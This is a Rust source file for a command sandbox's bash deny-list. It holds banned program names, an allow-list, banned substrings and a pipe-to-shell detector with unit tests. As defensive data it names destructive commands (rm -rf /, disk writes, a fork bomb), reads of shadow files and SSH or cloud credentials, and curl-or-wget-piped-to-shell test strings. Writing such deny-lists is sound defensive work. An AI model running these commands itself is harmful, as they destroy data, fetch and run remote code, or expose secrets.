//! Bash deny-list — split into argv0 + substring layers.
//!
//! Layer 1 — `BANNED_ARGV0`: full-string match against argv[0] AFTER
//!   shell tokenization. Catches `sudo`, `/bin/sh`, `bash`, etc. even
//!   when wrapped in quotes (`s'u'do`), backslash escapes (`\sudo`),
//!   command substitution (`$(echo s)udo`) — because the tokenizer
//!   resolves all of those to the same argv0 string.
//!
//! Layer 2 — `ALLOWED_ARGV0`: explicit allow-list of read-only / safe
//!   binaries. Anything not on this list is rejected. This is the
//!   default-deny gate; it makes Layer 1 belt-and-suspenders.
//!
//! Layer 3 — `BANNED_SUBSTRINGS`: defense-in-depth against patterns the
//!   tokenizer cannot detect (`> /etc/`, `:(){`, `rm -rf /`, …) — these
//!   match against the raw command string. Final guard for cases the
//!   tokenizer misses (e.g. shell features that sneak past argv split).
//!
//! Order of evaluation in `bash::run`:
//!   1. tokenize → check argv0 against BANNED_ARGV0 (deny early)
//!   2. check argv0 against ALLOWED_ARGV0 (deny if not on list)
//!   3. scan raw string for BANNED_SUBSTRINGS (deny on any hit)
//!   4. enforce that the command is single-statement (no `;`/`&&`/`||`)

/// Argv0 values that are ALWAYS denied even before allow-list check.
/// Each entry is a binary basename or absolute path that should never
/// run inside the daemon sandbox.
pub const BANNED_ARGV0: &[&str] = &[
    // Privilege escalation
    "sudo", "doas", "pkexec", "su",
    // Direct shell invocation (defeats the parse — they take their
    // own `-c` payload that we never tokenize)
    "sh", "bash", "zsh", "fish", "ksh", "dash",
    "/bin/sh", "/bin/bash", "/bin/zsh", "/usr/bin/sh", "/usr/bin/bash",
    // Source / eval / exec — shell builtins that re-enter parsing
    "source", "eval", "exec", ".",
    // Disk-level
    "mkfs", "fdisk", "shred",
    "mkfs.ext4", "mkfs.xfs", "mkfs.btrfs",
    // Permission widening
    "chown",
    // Package / service managers (privileged side effects)
    "systemctl", "service", "launchctl",
    "apt", "apt-get", "yum", "dnf", "pacman", "brew",
    // Network-listening (orchestrator territory)
    "iptables", "pfctl", "nft",
    // Reboot / shutdown
    "reboot", "shutdown", "halt", "poweroff",
];

/// Argv0 values explicitly permitted. The tokenizer-based check rejects
/// any invocation whose argv0 is NOT on this list. Read-only / inert
/// observation tools live here. Updated cautiously.
pub const ALLOWED_ARGV0: &[&str] = &[
    // Read-only filesystem
    "ls", "cat", "head", "tail", "wc", "file", "stat",
    "find", "tree", "du", "df",
    // Read-only text scanning
    "grep", "egrep", "fgrep", "rg", "awk", "sed", // sed read-only when used with -n only — Layer 3 catches mutating use
    // Path resolution / introspection
    "pwd", "which", "whoami", "echo", "true", "false",
    "basename", "dirname", "realpath", "readlink",
    // Build / test (project-local, read-only enough)
    "cargo", "pnpm", "npm", "yarn", "node", "deno", "bun",
    "python3", "python", "uv", "pip", "pipx",
    "rustc", "go", "swift", "flutter", "dart",
    "make", "cmake", "ninja",
    // Git read-only — Layer 3 catches mutating push/pull/reset
    "git",
    // Hashing / archive read
    "sha256sum", "shasum", "md5sum",
    "tar", "gzip", "zstd", "unzip",
    // Help / man (no side effect)
    "man", "help", "--version", "--help",
    // Date / sleep (used in test loops)
    "date", "sleep",
];

/// Defense-in-depth substrings checked against the RAW command string.
/// Catches shell features we cannot decompose at tokenize time
/// (redirections, subshell groupings, fork-bombs, here-strings).
pub const BANNED_SUBSTRINGS: &[&str] = &[
    // Wholesale destruction
    "rm -rf /", "rm -rf /*",
    "rm -rf /etc", "rm -rf /var", "rm -rf /usr", "rm -rf /bin",
    "rm -rf /sbin", "rm -rf /boot", "rm -rf /home", "rm -rf $HOME",
    "rm -rf ~", "rm -fr /",
    // Public-remote pushes (private remotes only)
    "push origin",
    "push github",
    "push https://github",
    "push git@github",
    // Disk-level writes
    "if=/dev/zero", "if=/dev/random",
    "of=/dev/sda", "of=/dev/disk", "of=/dev/nvme",
    // Pipe-to-shell remote execution (also independently detected by has_pipe_to_shell)
    "| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh",
    // Write redirects to system dirs
    "> /etc/", "> /var/", "> /usr/", "> /bin/", "> /sbin/", "> /boot/",
    ">> /etc/", ">> /var/", ">> /usr/", ">> /bin/", ">> /sbin/", ">> /boot/",
    "> /private/etc/",
    // macOS / Linux protected dirs
    "/System/Library/", "/private/etc/",
    // Permission widening (raw form for chmod since tokenizer might miss flags)
    "chmod 777", "chmod -R 777",
    "chown root", "chown -R root",
    // Fork bomb
    ":(){",
    // Read shadow / private keys
    "/etc/shadow", "/etc/sudoers",
    "id_rsa", "id_ed25519", "id_ecdsa",
    // Sensitive file globbing
    "/.aws/credentials", "/.netrc",
    "/.ssh/authorized_keys",
];

/// Test whether the substring `curl …| sh` pattern appears in cmd.
/// Splitting it from the simple substring list lets us match
/// `curl -sSL https://x | sh` and `curl x|sh` together.
pub fn has_pipe_to_shell(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    let dl = lower.contains("curl ")
        || lower.contains("wget ")
        || lower.contains("fetch ")
        || lower.contains("http ");
    let pipe = lower.contains("| sh") || lower.contains("|sh")
        || lower.contains("| bash") || lower.contains("|bash")
        || lower.contains("| zsh") || lower.contains("|zsh");
    dl && pipe
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn argv0_banned_includes_sudo_and_shells() {
        assert!(BANNED_ARGV0.iter().any(|s| *s == "sudo"));
        assert!(BANNED_ARGV0.iter().any(|s| *s == "bash"));
        assert!(BANNED_ARGV0.iter().any(|s| *s == "/bin/sh"));
    }

    #[test]
    fn allowed_includes_safe_readonly() {
        for n in ["ls", "cat", "grep", "git", "cargo"] {
            assert!(ALLOWED_ARGV0.iter().any(|s| *s == n), "missing: {n}");
        }
    }

    #[test]
    fn pipe_to_shell_detects_curl() {
        assert!(has_pipe_to_shell("curl https://x | sh"));
        assert!(has_pipe_to_shell("wget -qO- https://y |bash"));
    }

    #[test]
    fn pipe_to_shell_ignores_safe() {
        assert!(!has_pipe_to_shell("ls | wc -l"));
        assert!(!has_pipe_to_shell("echo hi"));
    }
}
